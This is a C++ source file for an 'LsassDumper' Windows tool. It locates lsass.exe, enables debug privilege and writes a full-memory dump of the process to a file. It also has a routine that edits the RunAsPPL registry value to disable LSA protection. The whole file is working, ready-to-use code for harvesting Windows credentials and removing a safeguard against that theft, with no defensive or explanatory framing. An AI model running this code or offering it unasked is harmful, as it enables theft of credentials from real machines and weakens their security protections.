#include "../include/LsassDumper.h"
#include <string>

#pragma comment(lib, "DbgHelp.lib")

LsassDumper::LsassDumper()
{

}

DWORD LsassDumper::GetLsassPID()
{
    DWORD lsassPID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    WCHAR wideProcessName[MAX_PATH] = L"";
    LPCWSTR processName = L"";

    if (Process32First(snapshot, &processEntry))
    {
        do
        {
            MultiByteToWideChar(CP_ACP, 0, processEntry.szExeFile, -1, wideProcessName, MAX_PATH);
            processName = wideProcessName;

            if (_wcsicmp(processName, L"lsass.exe") == 0)
            {
                lsassPID = processEntry.th32ProcessID;
                std::wcout << L"[+] Got lsass.exe PID: " << lsassPID << std::endl;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    else
    {
        PrintError(L"[-] Failed to enumerate processes.");
    }
    CloseHandle(snapshot);
    return lsassPID;
}

void LsassDumper::PrintError(const std::wstring& context)
{
    DWORD errorCode = GetLastError();
    LPWSTR messageBuffer = nullptr;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&messageBuffer,
        0,
        NULL
    );

    std::wcerr << context << L" Error: " << errorCode << L" (" << (messageBuffer ? messageBuffer : L"Unknown error") << L")" << std::endl;
    LocalFree(messageBuffer);
}

HANDLE LsassDumper::GetProcessHandle(DWORD pid)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        PrintError(L"Failed to open process handle.");
    }
    return hProcess;
}

bool LsassDumper::Dump(const std::wstring& dumpPath)
{
    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0)
    {
        std::cerr << "[-] Failed to find lsass.exe process." << std::endl;
        return false;
    }

    HANDLE lsassHandle = GetProcessHandle(lsassPID);
    if (!lsassHandle)
    {
        std::cerr << "[-] Failed to open lsass.exe process." << std::endl;
        return false;
    }

    HANDLE outFile = CreateFileW(dumpPath.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE)
    {
        PrintError(L"[-] Failed to create dump file.");
        CloseHandle(lsassHandle);
        return false;
    }

    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!isDumped)
    {
        PrintError(L"[-] Failed to create dump file.");
    }

    CloseHandle(lsassHandle);
    CloseHandle(outFile);

    if (isDumped)
    {
        std::cout << "[+] lsass dumped successfully!" << std::endl;
        return true;
    }
    else
    {
        PrintError(L"Failed to create dump file.");
        return false;
    }
}

bool LsassDumper::IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;

    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(
        &ntAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &adminGroup)) 
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

bool LsassDumper::ModifyLsaProtection(bool disable)
{
    HKEY hKey;
    LONG result;
    DWORD dwValue = disable ? 0 : 1;

    result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0,
        KEY_SET_VALUE | KEY_QUERY_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS)
    {
        std::cerr << "Failed to open registry key. Error code: " << result << std::endl;
        return false;
    }

    if (disable)
    {
        result = RegSetValueExW(
            hKey,
            L"RunAsPPL",
            0,
            REG_DWORD,
            reinterpret_cast<const BYTE*>(&dwValue),
            sizeof(dwValue)
        );
    }
    else
    {
        result = RegDeleteValueW(hKey, L"RunAsPPL");
        if (result != ERROR_SUCCESS)
        {
            std::wcerr << L"Failed to delete registry value. Error code: " << result << L" (" << GetLastError() << L")" << std::endl;
        }
    }

    RegCloseKey(hKey);

    return result == ERROR_SUCCESS;
}

bool LsassDumper::EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        std::cerr << "Failed to enable SE_DEBUG_NAME privilege." << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    std::cout << "SE_DEBUG_NAME privilege enabled successfully." << std::endl;
    return true;
}
